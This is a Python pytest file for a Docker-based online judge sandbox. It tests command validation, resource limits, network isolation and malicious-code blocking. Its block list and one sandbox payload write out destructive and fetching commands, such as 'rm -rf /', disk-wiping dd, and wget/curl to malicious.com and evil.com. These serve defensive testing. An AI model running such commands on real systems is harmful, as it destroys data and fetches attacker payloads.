#!/usr/bin/env python3
import pytest
import asyncio
import tempfile
import os
import subprocess
import time
from app.docker_judge import DockerJudge


class TestDockerSecurity:   # 测试 Docker        
    
    @pytest.fixture
    def docker_judge(self):     # 创建 Docker评测器对象
        return DockerJudge()
    
    @pytest.fixture
    def temp_code_files(self):   # 创建临时代码文件
        with tempfile.TemporaryDirectory() as temp_dir:
            # Python代码文件
            python_code = """print("Hello, World!")"""
            python_file = os.path.join(temp_dir, "main.py")
            with open(python_file, 'w') as f:
                f.write(python_code)
            
            # C++代码文件
            cpp_code = """#include <iostream>
int main() {
    std::cout << "Hello, World!" << std::endl;
    return 0;
}"""
            cpp_file = os.path.join(temp_dir, "main.cpp")
            with open(cpp_file, 'w') as f:
                f.write(cpp_code)
            
            yield {
                "python": python_file,
                "cpp": cpp_file,
                "temp_dir": temp_dir
            }
    
    def test_docker_availability(self, docker_judge):   # Docker可用性检查
        assert hasattr(docker_judge, 'docker_available')    # 确保docker_judge对象有"docker_available"属性
        
        if docker_judge.docker_available:
            result = subprocess.run(
                ["docker", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            assert result.returncode == 0    
            assert "Docker version" in result.stdout
    
    def test_command_validation(self, docker_judge):   # 测试命令过滤与安全校验
        allowed_commands = [
            "python main.py",
            "python3 test.py",
            "gcc -o main main.c",
            "g++ -std=c++11 main.cpp",
            "make build"
        ]
        
        for cmd in allowed_commands:
            assert docker_judge.validate_command(cmd), f"应该允许命令: {cmd}"
        
        # 测试黑名单命令
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "mount /dev/sda1 /mnt",
            "iptables -F",
            "systemctl stop sshd",
            "docker run --privileged",
            "wget http://malicious.com/script.sh",
            "curl -O http://evil.com/payload"
        ]
        
        for cmd in dangerous_commands:
            assert not docker_judge.validate_command(cmd), f"应该拒绝危险命令: {cmd}"
        
        # 测试危险参数
        dangerous_params = [
            "find . -exec rm {} \\;",
            "find . -ok rm {} \\;",
            "rm --recursive --force /",
            "rm --no-preserve-root /",
            "rm --preserve-root=0 /"
        ]
        
        for cmd in dangerous_params:
            assert not docker_judge.validate_command(cmd), f"应该拒绝危险参数: {cmd}"
    
    def test_dockerfile_creation(self, docker_judge, temp_code_files):
        """测试Dockerfile创建"""
        # 测试Python Dockerfile
        python_dockerfile = docker_judge.create_dockerfile(
            "python",
            temp_code_files["python"],
            "/app"
        )
        assert os.path.exists(python_dockerfile)
    
        with open(python_dockerfile, 'r') as f:
            content = f.read()
            assert "FROM python:3.9-slim" in content
            assert "WORKDIR /app" in content
            assert "COPY main.py ." in content
            assert 'CMD ["python", "main.py"]' in content
    
        # 测试C++ Dockerfile
        cpp_dockerfile = docker_judge.create_dockerfile(
            "cpp",
            temp_code_files["cpp"],
            "/app"
        )
        assert os.path.exists(cpp_dockerfile)
    
        with open(cpp_dockerfile, 'r') as f:
            content = f.read()
            assert "FROM gcc:11" in content
            assert "WORKDIR /app" in content
            assert "COPY main.cpp ." in content
            assert "RUN g++ -o main main.cpp" in content
            assert 'CMD ["./main"]' in content
        
        # 清理
        if os.path.exists(python_dockerfile):
            os.remove(python_dockerfile)
        if os.path.exists(cpp_dockerfile):
            os.remove(cpp_dockerfile)
    
    @pytest.mark.asyncio
    async def test_docker_sandbox_isolation(self, docker_judge, temp_code_files):
        """测试Docker沙箱隔离"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过沙箱测试")
        
        # 测试Python代码在Docker中运行
        result = await docker_judge.run_in_docker(
            language="python",
            code_file=temp_code_files["python"],
            input_data="",
            time_limit=5.0,
            memory_limit=128,
            container_name="test_python_sandbox"
        )
        
        assert result["status"] == "AC"
        assert "Hello, World!" in result["output"]
        
        # 测试C++代码在Docker中运行
        result = await docker_judge.run_in_docker(
            language="cpp",
            code_file=temp_code_files["cpp"],
            input_data="",
            time_limit=5.0,
            memory_limit=128,
            container_name="test_cpp_sandbox"
        )
        
        assert result["status"] == "AC"
        assert "Hello, World!" in result["output"]
    
    @pytest.mark.asyncio
    async def test_memory_time_limits(self, docker_judge):
        """测试内存和时间限制"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过限制测试")
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # 测试内存限制 - 创建会消耗大量内存的代码
            memory_test_code = """
import sys
import array

# 尝试分配超过限制的内存
try:
    # 尝试分配200MB内存（超过128MB限制）
    large_array = array.array('B', [0] * (200 * 1024 * 1024))
    print("Memory allocation succeeded")
except MemoryError:
    print("Memory limit enforced")
"""
            memory_file = os.path.join(temp_dir, "memory_test.py")
            with open(memory_file, 'w') as f:
                f.write(memory_test_code)
            
            result = await docker_judge.run_in_docker(
                language="python",
                code_file=memory_file,
                input_data="",
                time_limit=10.0,
                memory_limit=128,  # 128MB限制
                container_name="test_memory_limit"
            )
            
            # 应该因为内存超限而失败
            assert result["status"] in ["MLE", "RE"]
            
            # 测试时间限制 - 创建会超时的代码
            timeout_test_code = """
import time
import sys

# 尝试运行超过时间限制
time.sleep(10)  # 睡眠10秒，超过5秒限制
print("Should not reach here")
"""
            timeout_file = os.path.join(temp_dir, "timeout_test.py")
            with open(timeout_file, 'w') as f:
                f.write(timeout_test_code)
            
            result = await docker_judge.run_in_docker(
                language="python",
                code_file=timeout_file,
                input_data="",
                time_limit=5.0,  # 5秒限制
                memory_limit=128,
                container_name="test_time_limit"
            )
            
            # 应该因为超时而失败
            assert result["status"] == "TLE"
    
    @pytest.mark.asyncio
    async def test_security_restrictions(self, docker_judge):
        """测试安全限制"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过安全测试")

        with tempfile.TemporaryDirectory() as temp_dir:
            # 测试网络访问限制
            network_test_code = """
import socket
try:
    # 尝试连接外部网络
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('8.8.8.8', 53))
    print(f"Network access result: {result}")
    sock.close()
except Exception as e:
    print(f"Network access blocked: {e}")
"""
            network_file = os.path.join(temp_dir, "network_test.py")
            with open(network_file, 'w') as f:
                f.write(network_test_code)

            result = await docker_judge.run_in_docker(
                language="python",
                code_file=network_file,
                input_data="",
                time_limit=5.0,
                memory_limit=128,
                container_name="test_network_restriction"
            )

            # 应该被阻止访问网络
            assert result["status"] == "AC"
            assert "Network access blocked" in result["output"] or "Network access result: 101" in result["output"]
    
    @pytest.mark.asyncio
    async def test_malicious_code_prevention(self, docker_judge):
        """测试恶意代码防护"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过恶意代码测试")

        with tempfile.TemporaryDirectory() as temp_dir:
            # 测试危险命令执行
            dangerous_test_code = """
import os
import subprocess

try:
    # 尝试执行危险命令（应该被命令过滤阻止）
    result = os.system('rm -rf /')
    print(f"Dangerous command result: {result}")
except Exception as e:
    print(f"Dangerous command blocked: {e}")

try:
    # 尝试使用subprocess执行危险命令
    result = subprocess.run(['rm', '-rf', '/'], capture_output=True, text=True)
    print(f"Dangerous subprocess result: {result.returncode}")
except Exception as e:
    print(f"Dangerous subprocess blocked: {e}")
"""
            dangerous_file = os.path.join(temp_dir, "dangerous_test.py")
            with open(dangerous_file, 'w') as f:
                f.write(dangerous_test_code)

            result = await docker_judge.run_in_docker(
                language="python",
                code_file=dangerous_file,
                input_data="",
                time_limit=5.0,
                memory_limit=128,
                container_name="test_dangerous_commands"
            )

            # 应该被阻止执行危险命令
            assert result["status"] == "AC"
            assert ("Dangerous command blocked" in result["output"] or 
                   "Dangerous subprocess blocked" in result["output"] or
                   "Dangerous command result: 256" in result["output"] or
                   "Dangerous subprocess result: 1" in result["output"])
    
    @pytest.mark.asyncio
    async def test_normal_code_execution(self, docker_judge):
        """测试正常代码执行"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过正常代码测试")
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # 测试正常Python代码
            normal_python_code = """
# 正常计算代码
a = 10
b = 20
result = a + b
print(f"{a} + {b} = {result}")

# 正常循环
for i in range(5):
    print(f"Count: {i}")

# 正常字符串操作
text = "Hello, Docker Security!"
print(text.upper())
print(text.lower())
"""
            normal_python_file = os.path.join(temp_dir, "normal_python.py")
            with open(normal_python_file, 'w') as f:
                f.write(normal_python_code)
            
            result = await docker_judge.run_in_docker(
                language="python",
                code_file=normal_python_file,
                input_data="",
                time_limit=5.0,
                memory_limit=128,
                container_name="test_normal_python"
            )
            
            assert result["status"] == "AC"
            assert "10 + 20 = 30" in result["output"]
            assert "Count: 0" in result["output"]
            assert "HELLO, DOCKER SECURITY!" in result["output"]
            
            # 测试正常C++代码
            normal_cpp_code = """
#include <iostream>
#include <string>
#include <vector>

int main() {
    // 正常计算
    int a = 15, b = 25;
    int result = a * b;
    std::cout << a << " * " << b << " = " << result << std::endl;
    
    // 正常循环
    for (int i = 0; i < 3; i++) {
        std::cout << "Loop " << i << std::endl;
    }
    
    // 正常字符串操作
    std::string text = "C++ in Docker";
    std::cout << "Length: " << text.length() << std::endl;
    
    return 0;
}
"""
            normal_cpp_file = os.path.join(temp_dir, "normal_cpp.cpp")
            with open(normal_cpp_file, 'w') as f:
                f.write(normal_cpp_code)
            
            result = await docker_judge.run_in_docker(
                language="cpp",
                code_file=normal_cpp_file,
                input_data="",
                time_limit=5.0,
                memory_limit=128,
                container_name="test_normal_cpp"
            )
            
            assert result["status"] == "AC"
            assert "15 * 25 = 375" in result["output"]
            assert "Loop 0" in result["output"]
            assert "Length: 13" in result["output"]
    
    @pytest.mark.asyncio
    async def test_input_output_handling(self, docker_judge):
        """测试输入输出处理"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过IO测试")
        
        with tempfile.TemporaryDirectory() as temp_dir:
            # 测试Python输入输出
            io_python_code = """
# 读取输入并处理
input_data = input()
numbers = list(map(int, input_data.split()))
total = sum(numbers)
print(f"Sum: {total}")

# 处理多行输入
for i in range(3):
    line = input()
    print(f"Line {i+1}: {line}")
"""
            io_python_file = os.path.join(temp_dir, "io_python.py")
            with open(io_python_file, 'w') as f:
                f.write(io_python_code)
            
            input_data = "1 2 3 4 5\nHello\nWorld\nTest"
            result = await docker_judge.run_in_docker(
                language="python",
                code_file=io_python_file,
                input_data=input_data,
                time_limit=5.0,
                memory_limit=128,
                container_name="test_io_python"
            )
            
            assert result["status"] == "AC"
            assert "Sum: 15" in result["output"]
            assert "Line 1: Hello" in result["output"]
            assert "Line 2: World" in result["output"]
            assert "Line 3: Test" in result["output"]
            
            # 测试C++输入输出
            io_cpp_code = """
#include <iostream>
#include <string>
#include <sstream>

int main() {
    std::string input;
    std::getline(std::cin, input);
    
    std::istringstream iss(input);
    int num, sum = 0;
    while (iss >> num) {
        sum += num;
    }
    std::cout << "Sum: " << sum << std::endl;
    
    // 读取多行
    for (int i = 0; i < 2; i++) {
        std::getline(std::cin, input);
        std::cout << "Line " << (i+1) << ": " << input << std::endl;
    }
    
    return 0;
}
"""
            io_cpp_file = os.path.join(temp_dir, "io_cpp.cpp")
            with open(io_cpp_file, 'w') as f:
                f.write(io_cpp_code)
            
            input_data = "10 20 30\nFirst line\nSecond line"
            result = await docker_judge.run_in_docker(
                language="cpp",
                code_file=io_cpp_file,
                input_data=input_data,
                time_limit=5.0,
                memory_limit=128,
                container_name="test_io_cpp"
            )
            
            assert result["status"] == "AC"
            assert "Sum: 60" in result["output"]
            assert "Line 1: First line" in result["output"]
            assert "Line 2: Second line" in result["output"]
    
    @pytest.mark.asyncio
    async def test_judge_test_case_integration(self, docker_judge):
        """测试完整的评测集成"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过集成测试")
        
        # 测试标准评测模式
        result = await docker_judge.judge_test_case(
            code="print('Hello, World!')",
            language="python",
            input_data="",
            expected_output="Hello, World!",
            time_limit=5.0,
            memory_limit=128,
            judge_mode="standard"
        )
        
        assert result.status == "AC"
        assert result.time_used > 0
        assert result.memory_used >= 0
        
        # 测试严格评测模式
        result = await docker_judge.judge_test_case(
            code="print('Hello, World!')",
            language="python",
            input_data="",
            expected_output="Hello, World!",
            time_limit=5.0,
            memory_limit=128,
            judge_mode="strict"
        )
        
        assert result.status == "AC"
        
        # 测试错误输出
        result = await docker_judge.judge_test_case(
            code="print('Wrong Output')",
            language="python",
            input_data="",
            expected_output="Hello, World!",
            time_limit=5.0,
            memory_limit=128,
            judge_mode="standard"
        )
        
        assert result.status == "WA"
        assert result.actual_output == "Wrong Output"
        assert result.expected_output == "Hello, World!"
    
    @pytest.mark.asyncio
    async def test_cleanup_containers(self, docker_judge):
        """测试容器清理"""
        if not docker_judge.docker_available:
            pytest.skip("Docker不可用，跳过清理测试")
        
        # 运行一些测试容器
        with tempfile.TemporaryDirectory() as temp_dir:
            test_code = "print('Cleanup test')"
            test_file = os.path.join(temp_dir, "cleanup_test.py")
            with open(test_file, 'w') as f:
                f.write(test_code)
            
            # 运行多个容器
            for i in range(3):
                await docker_judge.run_in_docker(
                    language="python",
                    code_file=test_file,
                    input_data="",
                    time_limit=5.0,
                    memory_limit=128,
                    container_name=f"cleanup_test_{i}"
                )
            
            # 清理容器
            await docker_judge.cleanup_containers()
            
            # 验证容器已被清理
            result = subprocess.run(
                ["docker", "ps", "-a", "--filter", "name=oj_judge_", "--format", "{{.Names}}"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # 应该没有评测容器残留
            assert not result.stdout.strip() or "oj_judge_" not in result.stdout


if __name__ == "__main__":
    # 运行所有测试
    pytest.main([__file__, "-v"]) 